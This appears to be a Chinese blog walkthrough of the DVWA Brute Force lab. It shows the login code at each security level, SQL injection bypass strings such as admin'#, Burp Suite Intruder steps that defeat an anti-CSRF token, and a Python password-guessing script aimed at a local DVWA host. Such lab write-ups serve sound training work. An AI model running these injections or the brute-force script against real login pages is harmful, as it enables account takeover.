<p>&emsp;&emsp;暴力破解是指攻击者通过穷举的方式，一一验证，直到猜出用户口令。攻击者使用的穷举文本称为密码字典，密码字典中记录了多数用户的习惯密码，如qwer、1234等简单密码。当然要获取更精确的字典，需要攻击者进行社区信息采集，收集用户信息。</p>
<h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        echo <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        echo <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;登录界面如下：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/1.png" width="300" height="194"></div>

<p>&emsp;&emsp;源码中使用GET方式获取用户输入的参数，通过sql查询语句，查询用户名和密码是否对应。注意到代码没有对用户输入进行检查，不能防范sql注入攻击。没有对登录次数进行限制，因此也可以实施爆破。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>sql注入绕过</strong><br>&emsp;&emsp;由源码可知，查询正确时才会登录成功，因此我们的用户名至少要正确，密码可以通过sql注入绕过。很多服务器都会使用admin这个用户，我们输入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">admin<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过单引号闭合，并使用#注释后面的密码字段。若数据库中有admin用户，则可以正确查询。结果如下：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/2.png" width="300" height="255"></div>

<p><strong>爆破密码</strong></p>
<p>&emsp;&emsp;爆破需要使用burpsuit工具，打开burpsuit配置好代理，我们在登录界面输入用户名admin、密码123，burpsuit会抓取该数据包：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/3.png"></div>

<p>&emsp;&emsp;可以看到我们提交的http头部信息，如session和cookie信息、输入的用户名和密码等。将数据包send to intruder：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/4.png"></div>

<p>&emsp;&emsp;图中$$包含的部分是Intruder自动识别的变量，我们只需要爆破用户名和密码，只将用户名密码设置为需要破解的变量，其余的都clear。本次实验中我只选取密码字段来爆破：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/5.png"></div>

<p>&emsp;&emsp;设置好后，点击payloads，load导入我们的密码字典：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/6.png"></div>

<p>&emsp;&emsp;点击右上角start attack，burpsuit就开始爆破，尝试我们导入的每一个密码，结果如下：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/7.png" width="600" height="262"></div>

<p>&emsp;&emsp;在爆破时，需要关注length字段，当有一个密码的length与其他都不相同时，就可能是正确的密码。<br>&emsp;&emsp;使用爆破得到的用户名admin和密码password登录，登录成功：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/Low/8.png" width="300" height="275"></div>

<h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        echo <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        echo <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;中级代码中使用mysqli_real_escape_string对输入进行简单过滤，mysqli_real_escape_string(string,connection) 函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义，防止sql注入。<br>&emsp;&emsp;但代码并未对爆破进行限制，可以使用同上流程进行爆破，不同的是当登录错误时，会sleep延时2秒，因此爆破时间会更长。</p>
<h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><h2 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        echo <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        echo <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;代码中使用stripslashes函数去除字符串中的反斜杠＼，mysqli_real_escape_string函数对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。<br>&emsp;&emsp;由于使用了Anti-CSRF token来抵御CSRF的攻击，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。因此不能像安全级别Low一样简单爆破，需要重新设置。</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;在登录界面输入用户名admin、密码123，burpsuit会抓包：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/1.png"></div>

<p>&emsp;&emsp;可以看到包中有一个user_token变量，发送到 Intruder ，设置attack type为Pitchfork，清除其他变量，给password和user_token加上变量（美元$符号）：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/2.png"></div>

<p>&emsp;&emsp;在options中设置线程数为1：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/3.png" width="300" height="226"></div>

<p>&emsp;&emsp;在options中找到Grep-Extract模块，第一步点击add，会打开如下图界面，第二步点击Refresh response，在下方出现的数据中找到user_token的value，鼠标选中该值并复制，该值之后会用到，选中后其他数据会自动变化，然后点击ok：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/4.png"></div>

<p>&emsp;&emsp;在options中找到Redirections模块，设置为Always：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/5.png" width="400" height="367"></div>

<p>&emsp;&emsp;设置payloads。第一个变量为password，因此payloads和之前Low中一样，type为Simple list，load导入我们的密码字典：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/6.png" width="350" height="389"></div>

<p>&emsp;&emsp;第二个payloads为user_token，type设置为Recursive grep，然后在下方方框中粘贴我们复制的token值：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/7.png" width="350" height="398"></div>

<p>&emsp;&emsp;右上角start attack，开始爆破，按照length排序，length与其他不同的可能就是匹配值，结果如下：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/8.png" width="600" height="233"></div>

<p>&emsp;&emsp;除了使用Burpsuit，也可以使用python脚本构造数据包头部来爆破，给出一个脚本如下（脚本来源<a href="https://blog.csdn.net/qq_36119192/article/details/82938424" target="_blank">DVWA之Brute Force(暴力破解)</a>）：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">header=&#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.71.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://192.168.71.1/DVWA/vulnerabilities/brute/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;security=high; PHPSESSID=ors4oc2dv7hculoj5gasaghcp9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">requrl=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/brute/&quot;</span></span><br><span class="line"> </span><br><span class="line">def get_token(requrl,header):</span><br><span class="line">    response=requests.get(url=requrl,headers=header)</span><br><span class="line">    print (response.status_code,len(response.content))</span><br><span class="line">    soup=BeautifulSoup(response.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    input=soup.form.select(&quot;input[type=&#x27;hidden&#x27;]&quot;)   #返回的是一个list列表</span><br><span class="line">    user_token=input[0][&#x27;value&#x27;]                   #获取用户的token</span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"> </span><br><span class="line">user_token=get_token(requrl,header)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">&quot;C:\\Users\\24107\\Desktop\\password.txt&quot;</span>):</span><br><span class="line">    requrl=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;</span>+line.strip()+<span class="string">&quot;&amp;Login=Login&amp;user_token=&quot;</span>+user_token</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    print (i , <span class="string">&#x27;admin&#x27;</span> ,line.strip(),end=<span class="string">&quot;  &quot;</span>)</span><br><span class="line">    user_token=get_token(requrl,header)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;脚本中的字段是针对我个人电脑上的谷歌浏览器，在自己使用前，先burpsuit抓取一个登陆包，然后按照数据包中的头部数据和顺序替换脚本中的header，还有爆破对象的链接、密码字典存放路径也要记得修改。<br>&emsp;&emsp;结果如下：</p>
<div align="center"><img src="/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/High/9.png" width="300" height="462"></div>

<h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; isset ($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; isset ($_POST[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_POST[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_POST[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>;</span><br><span class="line">    $lockout_time       = <span class="number">15</span>;</span><br><span class="line">    $account_locked     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        $last_login = strtotime( $row[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * <span class="number">60</span>);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, <span class="attr">PDO</span>::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass, <span class="attr">PDO</span>::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar       = $row[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        $failed_login = $row[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        $last_login   = $row[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        echo <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        echo <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span 